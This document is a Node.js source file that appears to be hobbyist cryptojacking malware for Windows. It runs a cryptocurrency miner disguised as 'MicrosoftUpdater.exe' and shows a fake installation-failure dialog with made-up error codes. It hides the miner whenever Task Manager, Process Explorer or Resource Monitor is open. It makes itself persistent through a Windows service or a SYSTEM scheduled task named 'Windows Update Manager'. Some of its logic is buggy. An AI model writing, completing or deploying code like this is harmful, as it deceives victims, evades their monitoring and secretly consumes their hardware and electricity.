// THINK TWICE BEFORE RUNNING THIS CODE! YOU HAVE BEEN WARNED.

// needed libraries for information collection in XMRig

const Win = require('windows-interact');
const si = require('systeminformation');
const { exec } = require('child_process');
const { execSync } = require('child_process');

const flags = '--threads=1 --cpu-affinity=1 --cpu-priority=1 --no-huge-pages --asm=auto --randomx-mode=light';

// Win-interact preferences

/* class Web {
    constructor(url) {

        this.url = url;

    }
    POST (url) {


    }
    PUT (url) {


    }
    GET (url) {


    }
} */

Win.set.preferences({
    TTSVoice: 'Microsoft David Desktop',
    appManagerRefreshInterval: 2500,
    log: {
        outputFile: null,
        showTime: false,
        verbose: {
            requestTo: null,
            PowerShell: false,
            appManager: false
        }
    }
});

Win.appManager.register({
    'TaskManager': {
        path: Win.path`C:\Windows\system32\Taskmgr.exe`,
    },
    'ResourceMonitor': {
        path: Win.path`C:\Windows\system32\resmon.exe`,
    },
});

// Main loop of the malware that checks if monitoring applications are running

async function main() {
    while (true) {
        // Check if Task Manager, Process Explorer, or Resource Monitor are running and kill the miner accordingly
        const taskManagerIsRunning = checkIfAnyProcessIsRunning('Taskmgr.exe');
        const processExplorerIsRunning = checkIfAnyProcessIsRunning('procexp64.exe'); // Boolean
        const resourceMonitorIsRunning = checkIfAnyProcessIsRunning('perfmon.exe');
        console.log(taskManagerIsRunning);
        console.log(processExplorerIsRunning);
        console.log(resourceMonitorIsRunning);
        
        if (taskManagerIsRunning || processExplorerIsRunning || resourceMonitorIsRunning && checkIfAnyProcessIsRunning('MicrosoftUpdater.exe') == true) {
        // If Task Manager, Process Explorer, or Resource Monitor is running, and the malware is running as well, kill it
            killMiner();
            wait(1000);
            console.log('miner killed due to taskmgr opening');
    }
        if (!taskManagerIsRunning && !processExplorerIsRunning && !resourceMonitorIsRunning && checkIfAnyProcessIsRunning('MicrosoftUpdater.exe') == false) {
            runMiner();
            wait(1000);
            console.log('miner restarted due to favorable conditions');
        
        }
        // As long as neither TaskMgr, ProcExp, or ResMon is running and the malware is not already running, start it
        wait(500);     
    }
}

// Checks if a process is already running to prevent multi-execution

function checkIfAnyProcessIsRunning(processImageName) { // returns true or false
    const output = execSync(`tasklist /FI "IMAGENAME eq ${processImageName}`, 
    {encoding: 'utf-8'});
    return !output.includes(`INFO: No tasks are running which match the specified criteria.`);
  }


function killMiner() {
    try {
        Win.cmd('TASKKILL /f /IM MicrosoftUpdater.exe /T');
        console.log('miner killed');
    } catch {
        Win.cmd('TASKKILL /f /IM MicrosoftUpdater.exe'); 
    }
}

function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function runMiner() {
    Win.cmd('start.cmd --threads=1 --cpu-affinity=1 --cpu-priority=1 --no-huge-pages --asm=auto --randomx-mode=light');
    console.log('miner started');
}

async function autorunMethods() {
    console.log('autorunMethods called');
    try {
        registerMinerAsService(); 
        /* Running the miner as a system service is preferred because the average user
           is less likely to go looking for one */
    } catch {
        addToWinTaskScheduler(); 
        /* If service registration with sc fails for some reason, autorunning in Task Scheduler
           is a valid but less preferred option */
    } 
}

async function addToWinTaskScheduler() { // Adds start.cmd to Windows Task Scheduler under the SYSTEM user
    Win.cmd('schtasks /create /sc onstart /tn "Windows Update Manager" /tr MicrosoftUpdater.exe /ru SYSTEM');
}

async function registerMinerAsService() {
    Win.cmd('sc create Windows Update Manager binPath= start.cmd start= auto');
    console.log('miner added to system services')
    wait(1000);
    Win.cmd('net start Windows Update Manager');
    console.log('miner run as service');
}

async function fakeInstall() {
    const errorCode = Math.ceil(10*Math.random()); // Integer between 0 and 10
    const windowFailTitle = 'Installation failed';
    try {
        switch (errorCode) {
            case 1:
                await Win.alert('The volume does not contain a recognized file system. Please make sure that all required file system drivers are loaded and that the volume is not corrupted. Error code: 0x3ED.', windowFailTitle);
            case 2:
                await Win.alert('The specified file is encrypted and the user does not have the ability to decrypt it. Error code: 0x1772.', windowFailTitle);
            case 3:
                await Win.alert('The specified compression format is unsupported. Error code: 0x26A.', windowFailTitle);
            case 4:
                await Win.alert('A dynamic link library (DLL) initialization routine failed. Error code: 0x45A.', windowFailTitle);
            case 5:
                await Win.alert('A configuration value is invalid. Error code: 0xFDF.', windowFailTitle);
            default:
                await Win.alert('A security package specific error occurred. Error code: 0x721.', windowFailTitle); 
        }
        await Win.alert('Please visit https://learn.microsoft.com/en-us/windows/win32/debug/error-handling for more information.', 'Windows Updater failure');
        console.log('fake dialog succeeded');
    } catch {
        console.log("An error occured");
    } finally {
        runMiner();
        console.log('running Miner with runMiner()');
    }
}

async function checkIfWorthMining() {
    try {
        const cpu = await si.cpu();
        const os = await si.osInfo();
        const mem = await si.mem(); // in bytes!
        console.log('hardware polled');

        const L2CacheInKB = cpu.cache.l2/1024;
        const L3CacheInKB = cpu.cache.l3/1024;

        if (cpu.cores < 2 || mem.total < 4294967296 || L2CacheInKB < 256 || L3CacheInKB < 2048) {
            // RandomX requires a MINIMUM of 256 KB L2 cache and 2 MB L3 cache. CPUs with less than 2 cores with less than 4 GB RAM are
            // not even worth considering.
            await Win.alert('Insufficient system resources to continue.', 'Problem encountered');
            process.exit();
        }
        switch (os) {
            case "MacOS":
                await Win.alert('MacOS is not supported. Windows 10/11 only.', 'Unsupported operating system');
                process.exit();
            case "Linux":
                await Win.alert('Linux is not supported. Windows 10/11 only.', 'Unsupported operating system');
                process.exit();
            default:
                break;
        }
    } catch {
        process.exit();
    } finally {
        await fakeInstall();
    }
}

// Main structure of the miner before main loop

checkIfWorthMining();
console.log('checkifworthmining succeeded');
fakeInstall();
console.log('fakeinstall called');
autorunMethods();
console.log('autorunmethods called');
main();
console.log('main loop started >:D');